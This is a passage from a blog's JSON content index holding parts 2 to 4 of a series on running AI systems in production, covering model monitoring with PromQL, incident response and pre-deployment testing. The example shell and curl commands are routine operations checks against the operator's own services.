do it in production at 4am while management is screaming.\nAlso test: can you roll back quickly? If rollback takes 30 minutes, you\u0026rsquo;re going to have 30 minutes of broken service.\nSample rollback test script:\n#!/bin/bash set -e echo \u0026#34;=== Rollback Test ===\u0026#34; echo \u0026#34;Current version:\u0026#34; curl -s http://model-service:8080/version echo \u0026#34;\u0026#34; echo \u0026#34;Deploying new version...\u0026#34; ./deploy.sh v2.0.0 echo \u0026#34;Checking health...\u0026#34; curl -s http://model-service:8080/health echo \u0026#34;\u0026#34; echo \u0026#34;Rolling back...\u0026#34; ./rollback.sh echo \u0026#34;Checking health after rollback...\u0026#34; curl -s http://model-service:8080/health echo \u0026#34;\u0026#34; echo \u0026#34;Current version after rollback:\u0026#34; curl -s http://model-service:8080/version Time it. If it\u0026rsquo;s more than 5 minutes, your rollback is too slow.\nThe Testing Nobody Does (But Should) Chaos testing for AI\nKill the model mid-request. What happens? Does the system fail gracefully? Or does everything explode?\nCorrupt the input data. Feed malformed JSON. Send requests with missing required fields. See what breaks.\nMake the model slow. Artificially add latency. See if timeouts work. See if fallback logic kicks in.\nThis is painful. This will find bugs. This is why nobody does it. But you should.\nRegression testing\nNew model deployed. Is it better than the old model on everything? Or did you improve accuracy on common cases while making rare cases worse?\nTest new model against old model on the same datasets. Compare predictions. Look for regressions.\nI\u0026rsquo;ve seen \u0026ldquo;improvements\u0026rdquo; that increased overall accuracy by 2% while making critical edge cases 20% worse. Nobody noticed until production.\nBias and fairness testing\nDoes your model treat all groups equally? Or does it perform better for some demographics than others?\nThis isn\u0026rsquo;t just ethics (though it\u0026rsquo;s that too). It\u0026rsquo;s practical. If your model is biased, you\u0026rsquo;re going to get sued. Or you\u0026rsquo;re going to lose customers. Or you\u0026rsquo;re going to make the news for the wrong reasons.\nTest for disparate impact. Test for equal accuracy across groups. Test for fairness by whatever metric matters for your use case.\nWill management care about this? Probably not until it becomes a PR problem.\nMonitoring in staging\nYou have monitoring in production (Part 2). Do you have monitoring in staging?\nDeploy to staging. Let it run for a week. Monitor accuracy. Monitor drift. Monitor latency. See if anything weird happens.\nCatch problems in staging, not production.\nThe Testing That\u0026rsquo;s Impossible (But You Have To Try Anyway) Testing model explanations\nYour model makes a prediction. Can it explain why? Is the explanation correct?\nThis is incredibly hard to test. But if you\u0026rsquo;re deploying models where explanations matter (medical, financial, legal), you need to try.\nTake predictions. Look at explanations. Do they make sense? Are they consistent? Do subject matter experts agree with them?\nManual process. Doesn\u0026rsquo;t scale. Do it anyway.\nTesting for unknown unknowns\nHow do you test for things you don\u0026rsquo;t know about?\nYou can\u0026rsquo;t. But you can test for the category of \u0026ldquo;things that don\u0026rsquo;t look like training data.\u0026rdquo;\nBuild an anomaly detector for your inputs. When something weird comes in, flag it. In testing, verify that weird inputs get flagged and handled appropriately.\nWon\u0026rsquo;t catch everything. Better than nothing.\nWhat Good Testing Looks Like Before deployment:\nModel performs well on validation/test sets (baseline sanity check) Model performs acceptably on edge cases (won\u0026rsquo;t crash on weird inputs) Model has known failure modes documented (we know where it breaks) Model performance degrades gracefully (doesn\u0026rsquo;t fall off a cliff) Model integrates correctly with existing systems (end-to-end works) Model rollback procedure tested and works (we can undo this) Monitoring in place to catch problems (we\u0026rsquo;ll know if it breaks) After deployment (in staging):\nLet it run for a week Monitor everything Compare to production model Look for any anomalies If it looks good, ship to production If not, back to testing After deployment (in production):\nCanary deployment (small percentage of traffic) Monitor like crazy Compare to old model Gradually increase traffic Be ready to roll back at the first sign of trouble This is slow. This is boring. This catches bugs before users do.\nWhat Actually Happens Theory: Thorough testing before deployment. Catch all issues in staging.\nReality: \u0026ldquo;We need to ship this Friday.\u0026rdquo; Testing gets cut. Deploy to production. Hope for the best.\nThen: Production breaks. 3am incident. Rollback. Post-mortem.\nThen: \u0026ldquo;We need better testing.\u0026rdquo; Everyone agrees.\nThen: \u0026ldquo;We need to ship this Friday.\u0026rdquo; Testing gets cut again.\nCycle repeats.\nHow To Make Testing Happen 1. Make it fast\nIf testing takes three weeks, it won\u0026rsquo;t happen. Automate everything. Make it push-button. Make it fast enough that skipping it is harder than running it.\n2. Make it required\nDon\u0026rsquo;t make testing optional. Make it a gate. Model doesn\u0026rsquo;t deploy without test results. Management will complain. Hold firm.\n3. Make failures visible\nWhen testing finds problems, make sure everyone knows. Don\u0026rsquo;t hide failures. Make them loud. Make them embarrassing.\n4. Make it part of the culture\nTesting isn\u0026rsquo;t something the QA team does. Testing is something everyone does. Developers test. Data scientists test. Ops tests.\nIf your culture is \u0026ldquo;ship fast and fix bugs in production,\u0026rdquo; testing won\u0026rsquo;t happen. Change the culture or accept the 3am incidents.\nPart 5 Preview Next time: When to say no. How to push back when management wants to deploy something that shouldn\u0026rsquo;t be deployed. How to make it stick without getting fired.\nSpoiler: You won\u0026rsquo;t always win. But you need to try.\nPart 4 of N in a series on running AI systems. Part 1: Who Carries the Can? | Part 2: Monitoring | Part 3: Incident Response\n","date":"2 Jan 2026","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-4/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e We\u0026rsquo;ve tested the model. It works.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What did you test?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e We ran it on the validation set. 94% accuracy.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What about edge cases?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e What edge cases?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e The ones that will break it in production.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e We\u0026rsquo;ll handle those when we see them.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eAnd that\u0026rsquo;s how you end up debugging at 3am.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Testing that your model loads and returns predictions is not testing. That's checking if Python still works. Testing is finding out all the ways your model breaks before your users do.\"\n\u003c/aside\u003e\n\u003cp\u003ePart 4 of the series. This one\u0026rsquo;s about testing AI systems before deployment. Not the \u0026ldquo;it runs on my laptop\u0026rdquo; kind of testing. The \u0026ldquo;I\u0026rsquo;ve actively tried to break this and couldn\u0026rsquo;t\u0026rdquo; kind of testing.\u003c/p\u003e","tags":["ai","testing","operations","series"],"title":"AI Systems Responsibility: Part 4 - Testing Before You Ship (Or: Stop Discovering Bugs in Production)"},{"content":"3:47am. Phone rings. On-call engineer sounds panicked.\nOnCall: The model\u0026rsquo;s broken.\nSysadmin: What\u0026rsquo;s it doing?\nOnCall: Giving wrong answers.\nSysadmin: How wrong?\nOnCall: Very wrong. Accuracy dropped from 92% to 54% in the last hour.\nSysadmin: Any deployment changes?\nOnCall: No.\nSysadmin: Input data look different?\nOnCall: Don\u0026rsquo;t know. How do I check?\nSysadmin: Can you roll back?\nOnCall: To what? The model hasn\u0026rsquo;t changed.\nWelcome to AI incident response.\n\"Normal incident: 'The database crashed.' AI incident: 'The model's giving wrong answers and nobody knows why because machine learning is basically a magic box that we've convinced ourselves we understand.'\" Part 3 of the series. This one\u0026rsquo;s about what to do when your AI system breaks at 3am and you\u0026rsquo;re expected to have answers you don\u0026rsquo;t have.\nWhy AI Incidents Are Worse Normal software incident: Something breaks. You get logs. Stack traces. Error messages. You follow the trail. \u0026ldquo;This function threw an exception because this input was null because this service was down.\u0026rdquo; Root cause identified. Fix deployed. Done.\nAI incidents: Something breaks. No error. No exception. No stack trace. Just wrong predictions.\nManagement: Why is it wrong?\nSysadmin: I don\u0026rsquo;t know.\nManagement: What changed?\nSysadmin: Nothing we can see.\nManagement: Can you fix it?\nSysadmin: I don\u0026rsquo;t know what\u0026rsquo;s broken.\nThis is the conversation you\u0026rsquo;ll have with management at 4am. They won\u0026rsquo;t like it. You won\u0026rsquo;t like it. But it\u0026rsquo;s the truth.\nThe Incident Response Playbook (That Probably Won\u0026rsquo;t Work) Step 1: Confirm it\u0026rsquo;s actually broken\nIs accuracy really down? Or is someone panicking over normal variance?\nCheck your monitoring dashboards (you have those, right?). Compare current metrics to baseline. If accuracy dropped 2%, that might be noise. If it dropped 40%, something\u0026rsquo;s wrong.\nQuick sanity check:\ncurl -s http://model-service:8080/metrics | grep -E \u0026#34;model_accuracy|model_prediction_total\u0026#34; Or query Prometheus directly:\ncurl -s \u0026#39;http://prometheus:9090/api/v1/query?query=model_accuracy_ratio\u0026#39; | jq . curl -s \u0026#39;http://prometheus:9090/api/v1/query?query=rate(model_prediction_total[5m])\u0026#39; | jq . Compare to an hour ago:\nmodel_accuracy_ratio (model_accuracy_ratio offset 1h) model_accuracy_ratio - (model_accuracy_ratio offset 1h) Step 2: Roll back if you can\nCan you revert to the previous model? Do it. Don\u0026rsquo;t investigate. Don\u0026rsquo;t debug. Just roll back. Restore service first, investigate later.\n\u0026ldquo;But we need to understand why it broke!\u0026rdquo;\nLater. Right now we need it to stop being broken.\nOf course, this assumes:\nYou have a previous model to roll back to You have a tested rollback procedure The problem is with the model, not the data Good luck with all that.\nStep 3: Check the obvious things\nDid the input data change? Compare current input distribution to historical. If it shifted, that\u0026rsquo;s probably your problem. Is the model actually running? Or is it failing and returning cached/default predictions? Did upstream services change? API contract changed? Data format different? Infrastructure issues? GPU running hot? Memory pressure? Disk full? Quick checks:\ncurl -s http://model-service:8080/health curl -s http://model-service:8080/metrics | grep model_prediction_latency_seconds nvidia-smi free -h df -h /var/lib/model-data journalctl -u model-server --since \u0026#34;30 minutes ago\u0026#34; | tail -50 Check input distribution in Prometheus:\nmodel_input_feature_value_bucket{feature=\u0026#34;age\u0026#34;} topk(10, model_input_feature_value_bucket) Most of the time, it\u0026rsquo;s something boring. Input format changed. Upstream service is returning nulls. Someone deployed a \u0026ldquo;minor update\u0026rdquo; that broke everything.\nStep 4: Check the non-obvious things\nInput data looks fine? Model\u0026rsquo;s running? Infrastructure\u0026rsquo;s healthy? Now you\u0026rsquo;re in the hard part.\nFeature drift: Are the features the model uses still meaningful? Did someone change how a feature is calculated upstream? Adversarial inputs: Is someone gaming your model? Spam filters and fraud detection are particularly vulnerable. Data quality issues: Upstream data pipeline broke. Feeding garbage into your model. Model\u0026rsquo;s doing its best with garbage inputs. Model degradation: Your model trained on old data. World changed. Model\u0026rsquo;s now making predictions based on outdated patterns. Good luck debugging any of this at 4am.\nStep 5: Implement a workaround\nCan\u0026rsquo;t roll back? Can\u0026rsquo;t fix the root cause? Implement a workaround:\nRoute traffic to a simpler, more reliable model Fall back to rule-based logic Send high-risk predictions to human review Disable the AI entirely and go full manual Management will hate this. \u0026ldquo;We can\u0026rsquo;t just turn off the AI!\u0026rdquo;\nWatch me.\nConcrete workaround patterns:\nRoute to fallback model:\ncurl -X POST http://loadbalancer/admin/routes \\ -d \u0026#39;{\u0026#34;model\u0026#34;: \u0026#34;fallback-v1\u0026#34;, \u0026#34;weight\u0026#34;: 100}\u0026#39; Enable human review queue:\ncurl -X POST http://model-service/admin/config \\ -d \u0026#39;{\u0026#34;human_review_enabled\u0026#34;: true, \u0026#34;confidence_threshold\u0026#34;: 0.7}\u0026#39; Disable automatic decisions:\ncurl -X POST http://model-service/admin/config \\ -d \u0026#39;{\u0026#34;auto_approve\u0026#34;: false, \u0026#34;auto_deny\u0026#34;: false}\u0026#39; The Post-Mortem Nobody Wants to Write Normal incident post-mortem:\nRoot cause: Database deadlock due to concurrent writes Fix: Implemented proper locking Prevention: Added monitoring for lock contention AI incident post-mortem:\nRoot cause: Unknown. Accuracy dropped 45% suddenly. Fix: Rolled back to previous model Prevention: ¯\\_(ツ)_/¯ This won\u0026rsquo;t satisfy management. They want root cause. They want corrective actions. They want assurance it won\u0026rsquo;t happen again.\nYou don\u0026rsquo;t have any of that. Because the honest answer is: \u0026ldquo;Machine learning models are probabilistic systems trained on historical data. When the real world diverges from the training data in ways we didn\u0026rsquo;t anticipate, the model breaks. We can\u0026rsquo;t predict every way the world might change.\u0026rdquo;\nManagement: \u0026ldquo;That\u0026rsquo;s not acceptable.\u0026rdquo;\nMe: \u0026ldquo;Then don\u0026rsquo;t use AI.\u0026rdquo;\nManagement: \u0026ldquo;We need AI for competitive advantage.\u0026rdquo;\nMe: \u0026ldquo;Then accept that it will occasionally break in ways we can\u0026rsquo;t explain.\u0026rdquo;\nManagement doesn\u0026rsquo;t like this answer. Tough.\nWhat You Can Actually Do 1. Build better monitoring (Part 2)\nYou can\u0026rsquo;t debug what you can\u0026rsquo;t see. Track accuracy. Track input distributions. Track everything. When something breaks, at least you\u0026rsquo;ll know what changed.\n2. Have a rollback plan (Part 1)\nCan\u0026rsquo;t fix it? Roll back. You need a tested, automated rollback procedure. Not \u0026ldquo;we think we can roll back.\u0026rdquo; You need \u0026ldquo;I can run this script and we\u0026rsquo;re back to the old model in 90 seconds.\u0026rdquo;\n3. Have fallback logic\nWhen the AI breaks, what\u0026rsquo;s your plan B? Rule-based logic? Simpler model? Human review? You need something. \u0026ldquo;Hope the AI doesn\u0026rsquo;t break\u0026rdquo; is not a plan.\n4. Document known failure modes\nYour model will break in predictable ways. Document them. \u0026ldquo;Model fails when input contains emojis.\u0026rdquo; \u0026ldquo;Model fails on data from time zones we didn\u0026rsquo;t train on.\u0026rdquo; \u0026ldquo;Model fails during holiday shopping season when traffic patterns change.\u0026rdquo;\nWon\u0026rsquo;t prevent incidents, but at least you\u0026rsquo;ll know where to look.\n5. Have access to people who understand the model\nAt 4am, you need to reach someone who knows how the model works. Not \u0026ldquo;vaguely understands machine learning.\u0026rdquo; Actually knows this specific model. Good luck if they quit three months ago and took all the knowledge with them.\n6. Practice incident response\nRun drills. Simulate an accuracy drop. See how fast you can respond. See if your rollback procedure works. See if you can actually access the logs you need.\nMost teams don\u0026rsquo;t do this. Most teams find out their incident response doesn\u0026rsquo;t work when they\u0026rsquo;re in an actual incident.\nSample drill script:\n#!/bin/bash echo \u0026#34;=== AI Incident Response Drill ===\u0026#34; echo \u0026#34;1. Check model health:\u0026#34; curl -s http://model-service:8080/health echo \u0026#34;\u0026#34; echo \u0026#34;2. Check accuracy metrics:\u0026#34; curl -s http://model-service:8080/metrics | grep model_accuracy echo \u0026#34;\u0026#34; echo \u0026#34;3. Check recent errors:\u0026#34; journalctl -u model-server --since \u0026#34;5 minutes ago\u0026#34; | grep -i error echo \u0026#34;\u0026#34; echo \u0026#34;4. Test rollback command (dry-run):\u0026#34; echo \u0026#34;Would run: kubectl rollout undo deployment/model-server\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;5. Time how long this took:\u0026#34; Run it monthly. Track your response time. If it\u0026rsquo;s getting slower, you\u0026rsquo;ve got a problem.\nThe Scenarios You\u0026rsquo;ll Encounter Scenario 1: Silent degradation\nAccuracy slowly drops over weeks. Nobody notices until it hits a threshold. By the time you investigate, so much has changed you can\u0026rsquo;t pinpoint the cause. Was it data drift? Model decay? Something else? Who knows.\nScenario 2: Sudden catastrophic failure\nAccuracy drops 50% overnight. Turns out upstream service changed their API. Your parser broke. Been feeding garbage into your model for 6 hours. Rollback doesn\u0026rsquo;t help because the problem isn\u0026rsquo;t the model.\nScenario 3: The model is fine, everything else is broken\nModel\u0026rsquo;s working perfectly. Accuracy is good. But the system integrating with your model is broken. Passing wrong inputs. Ignoring outputs. Using predictions incorrectly. Your model gets blamed anyway.\nScenario 4: The model is doing exactly what it was trained to do (which is wrong)\nModel learned from biased training data. It\u0026rsquo;s making biased predictions. Accurately! According to the training data, it\u0026rsquo;s 95% correct. According to basic fairness, it\u0026rsquo;s completely wrong. This is not an ops problem. This is an \u0026ldquo;oh shit\u0026rdquo; problem.\nWhat Management Expects Immediate root cause analysis Clear corrective actions Assurance it won\u0026rsquo;t happen again Detailed timeline of events Explanation in non-technical terms What Management Gets \u0026ldquo;We think it might be data drift but we\u0026rsquo;re not sure\u0026rdquo; \u0026ldquo;We rolled back and it\u0026rsquo;s working now\u0026rdquo; \u0026ldquo;It might happen again\u0026rdquo; \u0026ldquo;Accuracy dropped at 3:47am, we rolled back at 4:15am\u0026rdquo; \u0026ldquo;The magic box stopped working so we turned it off and on again\u0026rdquo; They\u0026rsquo;re not going to be happy. But that\u0026rsquo;s the reality of running AI systems.\nPart 4 Preview Next time: Testing AI before deployment. Or as I like to call it: \u0026ldquo;How to avoid discovering your model is broken after you\u0026rsquo;ve already shipped it to production.\u0026rdquo;\nSpoiler: Most teams don\u0026rsquo;t do this. Most teams test that the model loads and returns predictions. That\u0026rsquo;s not testing. That\u0026rsquo;s hoping.\nPart 3 of N in a series on running AI systems. Part 1: Who Carries the Can? | Part 2: Monitoring\n","date":"19 Dec 2025","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-3/","summary":"\u003cp\u003e3:47am. Phone rings. On-call engineer sounds panicked.\u003c/p\u003e\n\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOnCall:\u003c/span\u003e The model\u0026rsquo;s broken.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What\u0026rsquo;s it doing?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOnCall:\u003c/span\u003e Giving wrong answers.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e How wrong?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOnCall:\u003c/span\u003e Very wrong. Accuracy dropped from 92% to 54% in the last hour.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Any deployment changes?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOnCall:\u003c/span\u003e No.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Input data look different?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOnCall:\u003c/span\u003e Don\u0026rsquo;t know. How do I check?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Can you roll back?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-oncall\"\u003eOnCall:\u003c/span\u003e To what? The model hasn\u0026rsquo;t changed.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eWelcome to AI incident response.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Normal incident: 'The database crashed.' AI incident: 'The model's giving wrong answers and nobody knows why because machine learning is basically a magic box that we've convinced ourselves we understand.'\"\n\u003c/aside\u003e\n\u003cp\u003ePart 3 of the series. This one\u0026rsquo;s about what to do when your AI system breaks at 3am and you\u0026rsquo;re expected to have answers you don\u0026rsquo;t have.\u003c/p\u003e","tags":["ai","incident-response","operations","series"],"title":"AI Systems Responsibility: Part 3 - Incident Response When You Have No Idea Why"},{"content":" Engineer: The model\u0026rsquo;s working fine. Look, uptime is 99.9%!\nSysadmin: And the accuracy?\nEngineer: What?\nSysadmin: The accuracy. What percentage of predictions are correct?\nEngineer: We don\u0026rsquo;t track that.\nSysadmin: Then you don\u0026rsquo;t know if it\u0026rsquo;s working.\n\"Your monitoring dashboard shows five green lights and one red one. The red one is 'model accuracy: unknown'. That's not a monitoring problem. That's a career problem.\" Part 2 of the series on running AI systems. This one\u0026rsquo;s about monitoring. Not the useless kind vendors sell you. The kind that actually tells you when things are broken before management finds out from Twitter.\nThe Usual Monitoring Is Useless Traditional monitoring for traditional systems: Is it up? Is it responding? What\u0026rsquo;s the latency? Memory usage? CPU? Disk I/O?\nAll useful. All necessary. All completely insufficient for AI systems.\nYour model can be up, responding in 50ms, using 30% CPU, and still be returning complete garbage. No alerts. No errors. Just confidently wrong answers.\nI\u0026rsquo;ve seen this. Model\u0026rsquo;s \u0026ldquo;working fine\u0026rdquo; according to all the standard metrics. Uptime dashboards showing green. SLA being met. Then someone checks the actual predictions and discovers it\u0026rsquo;s been wrong for three days. Accuracy dropped from 95% to 60%. Nobody noticed because nobody was looking.\n\u0026ldquo;But we have logging!\u0026rdquo;\nLogging what? That requests came in and responses went out? That tells me nothing about whether the responses were correct.\nWhat You Actually Need to Monitor 1. Prediction accuracy\nHow often is your model right? Not \u0026ldquo;right according to the training set.\u0026rdquo; Right in production. On real data. With real users.\nThis is harder than it sounds because you don\u0026rsquo;t always get ground truth immediately. User submits a support ticket, model categorizes it, ticket gets resolved three days later - that\u0026rsquo;s when you know if the categorization was correct. But you need to track it.\nIf accuracy drops 5%, I want to know. If it drops 10%, I want to be paged. If it drops 20%, I want the model rolled back automatically.\n2. Input distribution drift\nYour model was trained on data from 2023. It\u0026rsquo;s 2025 now. Is the input data still the same shape?\nPlot your input distributions. Compare them to your training data distributions. If they start diverging, that\u0026rsquo;s a problem. Model\u0026rsquo;s making predictions on data it\u0026rsquo;s never seen before.\nExample: Fraud detection model trained on pre-pandemic transaction patterns. Pandemic happens. Everyone starts buying things online. Transaction patterns change completely. Model\u0026rsquo;s still using old patterns. Accuracy tanks. You don\u0026rsquo;t notice because you\u0026rsquo;re only monitoring uptime.\n3. Output distribution drift\nWhat\u0026rsquo;s your model predicting? Is it still predicting the same distribution of outputs?\nIf your model normally predicts \u0026ldquo;class A\u0026rdquo; 70% of the time and \u0026ldquo;class B\u0026rdquo; 30% of the time, and suddenly it\u0026rsquo;s predicting \u0026ldquo;class A\u0026rdquo; 95% of the time, something changed. Either the input data changed or the model\u0026rsquo;s broken.\nTrack this. Alert on it. Investigate when it changes.\n4. Prediction confidence\nMost models return a confidence score. \u0026ldquo;I\u0026rsquo;m 95% sure this is spam.\u0026rdquo; \u0026ldquo;I\u0026rsquo;m 60% sure this transaction is fraudulent.\u0026rdquo;\nTrack the distribution of confidence scores. If your model suddenly starts returning low-confidence predictions for everything, that\u0026rsquo;s a sign it\u0026rsquo;s seeing data it doesn\u0026rsquo;t know how to handle.\nWorse: if it\u0026rsquo;s returning high-confidence predictions that are wrong, your model\u0026rsquo;s not just broken, it\u0026rsquo;s confidently broken.\n5. Feature importance drift\nWhich features is your model using to make decisions? Is that changing over time?\nIf your fraud detection model suddenly starts weighting \u0026ldquo;time of day\u0026rdquo; more heavily than \u0026ldquo;transaction amount,\u0026rdquo; something\u0026rsquo;s wrong. Either the data changed or the model retrained on bad data.\n6. Latency percentiles (not just averages)\nAverage latency is 100ms? Great. P99 latency is 10 seconds? Not great.\nAI models have unpredictable latency. Some inputs are fast, some are slow. If your P99 latency starts climbing, you\u0026rsquo;ve got a problem. Maybe certain inputs are causing slowdowns. Maybe your GPU\u0026rsquo;s throttling. Maybe your model\u0026rsquo;s just slow on certain edge cases.\nTrack P50, P95, P99. Alert when they drift outside acceptable ranges.\nThe Hard Part: Getting Ground Truth Monitoring accuracy requires knowing what the right answer is. For some systems, you get this easily:\nSpam filter: User marks email as spam or not spam Fraud detection: Transaction gets investigated, confirmed fraud or not Search ranking: User clicks on result or doesn\u0026rsquo;t For other systems, you never get ground truth:\nCredit scoring: You approved the loan. Did they pay it back? You won\u0026rsquo;t know for years. Medical diagnosis: Model suggests a diagnosis. Doctor overrides it. Was the model right and the doctor wrong? Or vice versa? When you can\u0026rsquo;t get ground truth, you monitor proxy metrics:\nUser satisfaction scores Human override rates (if humans are overriding the model 50% of the time, something\u0026rsquo;s wrong) Complaint rates Business metrics (revenue, conversion rates, churn) Not perfect, but better than nothing.\nAlerting That Doesn\u0026rsquo;t Suck Standard monitoring alerts: \u0026ldquo;Service is down.\u0026rdquo; \u0026ldquo;Latency above threshold.\u0026rdquo; \u0026ldquo;Memory usage critical.\u0026rdquo;\nAI monitoring alerts need context:\nBad alert: \u0026ldquo;Model accuracy below 90%\u0026rdquo;\nGood alert: \u0026ldquo;Model accuracy dropped from 94% to 87% in the last hour. Input distribution shifted. Rollback recommended.\u0026rdquo;\nInclude trend data. Include comparison to baseline. Include actionable information.\nAnd for the love of all that\u0026rsquo;s holy, don\u0026rsquo;t alert on every tiny fluctuation. Set thresholds that matter. If accuracy dropping from 95.2% to 95.1% doesn\u0026rsquo;t require action, don\u0026rsquo;t page me about it.\nTools That Don\u0026rsquo;t Hate You You don\u0026rsquo;t need fancy AI-specific monitoring platforms. You need:\nPrometheus/Grafana (or equivalent): Track metrics over time. Plot distributions. Alert on thresholds.\nData pipeline that logs predictions and outcomes: Store your predictions. Store your ground truth when you get it. Join them later for accuracy calculations.\nDashboards that show trends: Not just \u0026ldquo;current accuracy: 92%.\u0026rdquo; Show me a graph of accuracy over the last 30 days. Show me input distribution drift. Show me feature importance.\nAutomated reports: Daily/weekly summary of model performance. Accuracy trends, distribution drift, latency percentiles. Something I can skim in 2 minutes to confirm nothing\u0026rsquo;s on fire.\nMake It Real: A Minimal Metrics Set You can\u0026rsquo;t alert on \u0026ldquo;model drift\u0026rdquo; if you never emit any model metrics.\nAt minimum, your inference service should expose:\nmodel_requests_total{model, endpoint, status} model_latency_seconds_bucket{model, endpoint} (histogram) model_predictions_total{model, label} (counter) model_confidence_bucket{model} (histogram, 0-1) If you have delayed ground truth, add:\nmodel_labels_total{model, label} (counter - the truth when it arrives) Then you can compute an accuracy proxy over a window when the labels land.\nPromQL You Can Actually Use Latency (p95):\nhistogram_quantile( 0.95, sum by (le, model) (rate(model_latency_seconds_bucket[10m])) ) Output distribution shift (label share changes):\nsum by (label) (rate(model_predictions_total{model=\u0026#34;fraud-v3\u0026#34;}[15m])) / sum(rate(model_predictions_total{model=\u0026#34;fraud-v3\u0026#34;}[15m])) Confidence collapse (too many low-confidence predictions):\nsum(rate(model_confidence_bucket{model=\u0026#34;fraud-v3\u0026#34;,le=\u0026#34;0.3\u0026#34;}[15m])) / sum(rate(model_confidence_bucket{model=\u0026#34;fraud-v3\u0026#34;,le=\u0026#34;1\u0026#34;}[15m])) If you can join predictions to ground truth and emit both counters, you can do a rough \u0026ldquo;eventual accuracy\u0026rdquo; for class labels:\nsum(rate(model_correct_total{model=\u0026#34;fraud-v3\u0026#34;}[1h])) / sum(rate(model_labelled_total{model=\u0026#34;fraud-v3\u0026#34;}[1h])) That last one requires your pipeline to increment model_labelled_total when you receive ground truth, and model_correct_total when it matches the original prediction.\nIf you\u0026rsquo;re not doing that, your \u0026ldquo;accuracy\u0026rdquo; graph is a lie.\nWhat Actually Happens Theory: You set up thorough monitoring. You track accuracy, drift, latency. You get alerts when things degrade. You catch problems early.\nReality: You set up monitoring. Management complains it\u0026rsquo;s too expensive to log all predictions. You compromise, log 10% sample. Drift happens in the other 90%. You don\u0026rsquo;t catch it. Model\u0026rsquo;s broken for a week before someone notices.\nOr: You set up alerts. They fire constantly because the thresholds are wrong. You tune the thresholds. Now they never fire. Model breaks. No alert. You find out from an angry customer email.\nOr: You track everything. Build beautiful dashboards. Nobody looks at them. Model\u0026rsquo;s accuracy drops 15%. Dashboard shows it clearly. Nobody notices until revenue drops and management demands to know why.\nThis is why you need:\nAutomated checks: If accuracy drops below threshold, automatically roll back. Don\u0026rsquo;t wait for a human to notice.\nRegular reviews: Weekly review of model metrics. Bake it into your ops routine. Don\u0026rsquo;t rely on dashboards that nobody looks at.\nBusiness metric correlation: Tie your model metrics to business metrics. When model accuracy drops, does revenue drop? Does customer satisfaction drop? Make the business case for fixing it.\nPart 3 Preview Next up: incident response for AI systems. What to do when your model goes sideways at 3am and management wants answers you don\u0026rsquo;t have.\nSpoiler: It\u0026rsquo;s worse than normal ops because \u0026ldquo;I don\u0026rsquo;t know why it\u0026rsquo;s wrong\u0026rdquo; is not an acceptable answer, but it\u0026rsquo;s often the true answer.\nPart 2 of N in a series on running AI systems. Read Part 1: Who Carries the Can?\n","date":"12 Dec 2025","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-2/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e The model\u0026rsquo;s working fine. Look, uptime is 99.9%!\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e And the accuracy?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e What?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e The accuracy. What percentage of predictions are correct?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e We don\u0026rsquo;t track that.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Then you don\u0026rsquo;t know if it\u0026rsquo;s working.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Your monitoring dashboard shows five green lights and one red one. The red one is 'model accuracy: unknown'. That's not a monitoring problem. That's a career problem.\"\n\u003c/aside\u003e\n\u003cp\u003ePart 2 of the series on running AI systems. This one\u0026rsquo;s about monitoring. Not the useless kind vendors sell you. The kind that actually tells you when things are broken before management finds out from 